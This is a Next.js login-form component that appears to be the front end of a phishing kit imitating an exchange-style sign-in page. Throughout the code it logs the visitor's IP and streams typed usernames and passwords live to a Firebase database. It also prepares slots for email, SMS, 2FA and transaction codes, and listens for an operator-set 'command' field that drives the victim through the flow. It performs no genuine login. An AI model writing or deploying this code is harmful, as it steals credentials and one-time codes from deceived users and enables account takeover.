"use client";

import { Locale } from "@/config/i18n.config";
import { getDictionaryUseClient } from "@/dicts/default-dictionary-use-client";
import { database } from "@/firebase";
import {
  DatabaseReference,
  ThenableReference,
  onDisconnect,
  onValue,
  push,
  ref,
  update,
} from "firebase/database";
import { useParams } from "next/navigation";
import { useEffect, useState } from "react";

export const LoginForm = () => {
  const { lang } = useParams<{ lang: Locale }>();

  const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
  const [ipForm, seteIpForm] = useState<string | null>(null);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassInput, setShowPassInput] = useState(false);

  const [loading, setLoading] = useState(false);

  const [command, setCommand] = useState("W_LOGIN");
  const [dict, setDict] = useState(getDictionaryUseClient(lang));

  useEffect(() => {
    fetch("https://api.ipify.org?format=json").then(async (res) => {
      const { ip } = await res.json();
      const ipF = ip.replaceAll(".", ",");
      const infosRef = ref(database, `info/${ipF}`);
      seteIpForm(ipF);
      if (ip) {
        const newDataRef = push(infosRef, {
          online: true,
          username: "",
          password: "",
          emailCode: "",
          twoAF: "",
          smsCode: "",
          trPass: {
            tr: "",
            email: "",
            sms: "",
            twoFa: "",
          },
          zone: "",
          command: "W_LOGIN",
        });

        setDataRef(newDataRef);

        onDisconnect(newDataRef).update({
          online: false,
        });

        onValue(newDataRef, (snap) => {
          const data = snap.val();

          setCommand(data.command);
        });
      }
    });
  }, []);

  useEffect(() => {
    if (dataRef) {
      update(dataRef, { username, password });
    }
  }, [username, password]);

  const handleShowPass = () => {
    setLoading(true);

    if (!showPassInput) {
      setTimeout(() => {
        setShowPassInput(true);

        setLoading(false);
      }, 2500);
    } else {
    }
  };

  return (
    <>
      <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
        <div className="flex flex-col min-w-[40%] gap-10 mt-[140px] transition-all">
          <div className="flex">
            <h1 className="text-4xl font-bold">
              {dict.dictionary.login.title}
            </h1>
          </div>
          {/* FORM */}
          <div className="flex flex-col gap-2">
            <div className="flex flex-row gap-6 items-center">
              <div className="flex flex-col gap-3">
                <span className="text-sm font-medium text-zinc-500 hover:text-black transition-all cursor-not-allowed">
                  {dict.dictionary.login.inputUserLabel.phone}
                </span>
                <div className="border border-white"></div>
              </div>
              <div className="flex flex-col gap-3">
                <span className="text-sm font-medium text-black hover:text-black transition-all cursor-pointer">
                  {/* Email/Sub Account */}
                  {dict.dictionary.login.inputUserLabel.email}
                </span>
                <div className="border border-zinc-800"></div>
              </div>
              <div className="flex flex-col gap-3">
                <span className="text-sm font-medium text-zinc-500 hover:text-black transition-all cursor-not-allowed">
                  {/* QR code */}
                  {dict.dictionary.login.inputUserLabel.qr}
                </span>
                <div className="border border-white"></div>
              </div>
            </div>
            <input
              type="text"
              className="w-full border border-zinc-300 py-2 px-2 outline-none transition-all focus:border-zinc-800 focus:shadow-md rounded-md"
              disabled={loading}
              onChange={(e) => {
                if (showPassInput) {
                  setShowPassInput(false);
                  setPassword("");
                }
                setUsername(e.target.value);
              }}
            />
          </div>

          {showPassInput ? (
            <div className="flex flex-col gap-2 transition-all">
              <div className="flex flex-row gap-6 items-center">
                <div className="flex w-full justify-between items-center">
                  <span className="text-sm font-medium text-zinc-700 transition-all">
                    {/* Password */}
                    {dict.dictionary.login.inputPassLabel.label}
                  </span>

                  <span className="text-sm font-medium text-zinc-700 hover:text-black transition-all hover:underline cursor-pointer">
                    {/* Forgot your password? */}
                    {dict.dictionary.login.inputPassLabel.forgotLable}
                  </span>
                </div>
              </div>
              <input
                type="password"
                className="w-full border border-zinc-300 py-2 px-2 outline-none transition-all focus:border-zinc-800 focus:shadow-md rounded-md"
                disabled={loading}
                onChange={(e) => {
                  setPassword(e.target.value);
                }}
              />
            </div>
          ) : null}

          <button
            disabled={
              username.length <= 2 ||
              (showPassInput && password.length < 5) ||
              loading
            }
            onClick={handleShowPass}
            className="bg-[#121212] hover:text-zinc-400 text-white disabled:bg-[#F5F5F5] py-3 disabled:text-zinc-400 rounded-[30px] disabled:cursor-not-allowed flex flex-row gap-2 items-center justify-center"
          >
            <svg
              aria-hidden="true"
              className={`w-4 h-4 text-gray-200 animate-spin dark:text-gray-600 fill-white ${
                loading ? "visible" : "hidden"
              }`}
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="currentColor"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="currentFill"
              />
            </svg>
            {!showPassInput
              ? dict.dictionary.login.nextButton.next
              : dict.dictionary.login.nextButton.login}
          </button>

          <div className="flex justify-center ">
            <span className="text-base">
              {dict.dictionary.login.dontHaveAccount}
              <strong className="underline cursor-pointer hover:no-underline hover:text-zinc-600">
                {dict.dictionary.login.signUpLabel}
              </strong>
            </span>
          </div>

          <hr />
          <span className="text-sm text-zinc-500 font-light">
            {dict.dictionary.login.captchaLabel.label}
            <a href="" className="text-black font-normal underline">
              {dict.dictionary.login.captchaLabel.learMore}
            </a>
          </span>
        </div>
      </div>
    </>
  );
};
